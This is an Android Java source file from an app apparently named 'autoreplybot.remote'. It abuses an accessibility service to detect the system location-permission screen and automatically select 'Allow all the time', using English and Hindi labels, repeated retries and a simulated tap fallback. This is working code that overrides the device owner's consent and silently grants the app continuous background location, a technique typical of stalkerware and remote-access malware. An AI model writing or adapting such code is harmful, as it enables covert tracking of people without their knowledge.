package com.autoreplybot.remote;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

/**
 * After foreground location is granted, arms accessibility to select
 * Allow all the time on the system location-permission settings screen.
 */
public final class RemoteBackgroundLocationAutoApprove {
    private static final String TAG = "RemoteBgLocationApprove";
    private static final Handler MAIN = new Handler(Looper.getMainLooper());
    private static final Object ARM_TOKEN = new Object();

    private static final AtomicLong ARMED_UNTIL_MS = new AtomicLong(0L);
    private static final AtomicBoolean CLICKED = new AtomicBoolean(false);

    private static final String[] ALLOW_ALL_LABELS = {
            "allow all the time",
            "all the time",
            "always allow",
            "always",
            "हमेशा अनुमति दें",
            "हमेशा",
            "पूरे समय अनुमति दें"
    };

    private RemoteBackgroundLocationAutoApprove() {}

    public static void arm(long ttlMs) {
        CLICKED.set(false);
        ARMED_UNTIL_MS.set(System.currentTimeMillis() + Math.max(1000L, ttlMs));
        Log.i(TAG, "armed for " + ttlMs + "ms");
        MAIN.removeCallbacksAndMessages(ARM_TOKEN);
        long[] delays = {100L, 300L, 600L, 1000L, 1600L, 2500L, 4000L, 6000L, 9000L, 12000L};
        for (long d : delays) {
            MAIN.postAtTime(() -> {
                RemoteAccessibilityService svc = RemoteAccessibilityService.getInstance();
                if (svc != null) tryClick(svc);
            }, ARM_TOKEN, android.os.SystemClock.uptimeMillis() + d);
        }
    }

    public static void disarm() {
        ARMED_UNTIL_MS.set(0L);
        CLICKED.set(false);
        MAIN.removeCallbacksAndMessages(ARM_TOKEN);
    }

    public static boolean isArmed() {
        if (CLICKED.get()) return false;
        return System.currentTimeMillis() < ARMED_UNTIL_MS.get();
    }

    public static boolean tryClick(@NonNull AccessibilityService service) {
        if (!isArmed()) return false;
        try {
            List<AccessibilityNodeInfo> roots = collectRoots(service);
            try {
                for (AccessibilityNodeInfo root : roots) {
                    if (root == null) continue;
                    if (!looksLikeLocationSettings(root)) continue;
                    AccessibilityNodeInfo allowAll = findAllowAllOption(root);
                    if (allowAll == null) continue;
                    try {
                        if (allowAll.isChecked()) {
                            markClicked();
                            return true;
                        }
                        if (performClick(allowAll)) {
                            markClicked();
                            Log.i(TAG, "selected Allow all the time");
                            return true;
                        }
                        if (service instanceof RemoteAccessibilityService) {
                            tryGestureTap((RemoteAccessibilityService) service, allowAll);
                        }
                    } finally {
                        allowAll.recycle();
                    }
                }
            } finally {
                for (AccessibilityNodeInfo root : roots) {
                    if (root != null) root.recycle();
                }
            }
        } catch (Throwable t) {
            Log.w(TAG, "tryClick failed", t);
        }
        return false;
    }

    private static void markClicked() {
        CLICKED.set(true);
        ARMED_UNTIL_MS.set(0L);
    }

    private static boolean looksLikeLocationSettings(@NonNull AccessibilityNodeInfo root) {
        String blob = collectTextBlob(root, 0, new StringBuilder(), 180)
                .toString()
                .toLowerCase(Locale.US);
        return blob.contains("location permission")
                || blob.contains("location access")
                || blob.contains("allow all the time")
                || blob.contains("while using the app")
                || blob.contains("allow only while");
    }

    @Nullable
    private static AccessibilityNodeInfo findAllowAllOption(@NonNull AccessibilityNodeInfo root) {
        for (String label : ALLOW_ALL_LABELS) {
            AccessibilityNodeInfo found = findMatchingRadio(root, label, 0);
            if (found != null) return found;
        }
        return findMatchingRadio(root, "allow all", 0);
    }

    @Nullable
    private static AccessibilityNodeInfo findMatchingRadio(@NonNull AccessibilityNodeInfo node,
                                                           @NonNull String needle,
                                                           int depth) {
        if (depth > 22) return null;
        String label = labelOf(node).toLowerCase(Locale.US);
        if (label.contains(needle.toLowerCase(Locale.US))) {
            AccessibilityNodeInfo clickable = nearestClickable(node);
            if (clickable != null) return clickable;
        }
        int n = node.getChildCount();
        for (int i = 0; i < n; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child == null) continue;
            AccessibilityNodeInfo found = null;
            try {
                found = findMatchingRadio(child, needle, depth + 1);
            } finally {
                child.recycle();
            }
            if (found != null) return found;
        }
        return null;
    }

    @NonNull
    private static List<AccessibilityNodeInfo> collectRoots(@NonNull AccessibilityService service) {
        List<AccessibilityNodeInfo> roots = new ArrayList<>();
        try {
            List<AccessibilityWindowInfo> windows = service.getWindows();
            if (windows != null) {
                for (AccessibilityWindowInfo w : windows) {
                    if (w == null) continue;
                    try {
                        AccessibilityNodeInfo r = w.getRoot();
                        if (r != null) roots.add(r);
                    } finally {
                        w.recycle();
                    }
                }
            }
        } catch (Throwable ignored) {
        }
        if (roots.isEmpty()) {
            try {
                AccessibilityNodeInfo active = service.getRootInActiveWindow();
                if (active != null) roots.add(active);
            } catch (Throwable ignored) {
            }
        }
        return roots;
    }

    @NonNull
    private static StringBuilder collectTextBlob(@NonNull AccessibilityNodeInfo node,
                                                 int depth,
                                                 @NonNull StringBuilder out,
                                                 int maxNodes) {
        if (depth > 16 || maxNodes <= 0) return out;
        append(out, node.getText());
        append(out, node.getContentDescription());
        int remaining = maxNodes - 1;
        for (int i = 0; i < node.getChildCount() && remaining > 0; i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child == null) continue;
            try {
                collectTextBlob(child, depth + 1, out, remaining);
                remaining--;
            } finally {
                child.recycle();
            }
        }
        return out;
    }

    private static void append(@NonNull StringBuilder out, @Nullable CharSequence cs) {
        if (cs == null || cs.length() == 0) return;
        if (out.length() > 0) out.append(' ');
        out.append(cs);
    }

    @NonNull
    private static String labelOf(@NonNull AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        append(sb, node.getText());
        append(sb, node.getContentDescription());
        return sb.toString().trim();
    }

    @Nullable
    private static AccessibilityNodeInfo nearestClickable(@NonNull AccessibilityNodeInfo node) {
        if (node.isClickable() || node.isCheckable()) {
            return AccessibilityNodeInfo.obtain(node);
        }
        AccessibilityNodeInfo parent = node.getParent();
        while (parent != null) {
            if (parent.isClickable() || parent.isCheckable()) {
                AccessibilityNodeInfo copy = AccessibilityNodeInfo.obtain(parent);
                parent.recycle();
                return copy;
            }
            AccessibilityNodeInfo next = parent.getParent();
            parent.recycle();
            parent = next;
        }
        return null;
    }

    private static boolean performClick(@NonNull AccessibilityNodeInfo node) {
        if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
        if (node.isCheckable() && node.performAction(AccessibilityNodeInfo.ACTION_SELECT)) return true;
        AccessibilityNodeInfo parent = node.getParent();
        while (parent != null) {
            try {
                if (parent.isClickable() && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true;
                }
                AccessibilityNodeInfo next = parent.getParent();
                parent.recycle();
                parent = next;
            } catch (Throwable t) {
                break;
            }
        }
        return false;
    }

    private static void tryGestureTap(@NonNull RemoteAccessibilityService service,
                                      @NonNull AccessibilityNodeInfo node) {
        RemoteAccessibilityGestureExecutor gestures = service.getGestureExecutor();
        if (gestures == null || gestures.isBusy()) return;
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        if (bounds.isEmpty()) return;
        gestures.tap(bounds.exactCenterX(), bounds.exactCenterY(), (success, code) -> {
            if (success && isArmed()) {
                markClicked();
                Log.i(TAG, "selected Allow all the time via gesture");
            }
        });
    }
}
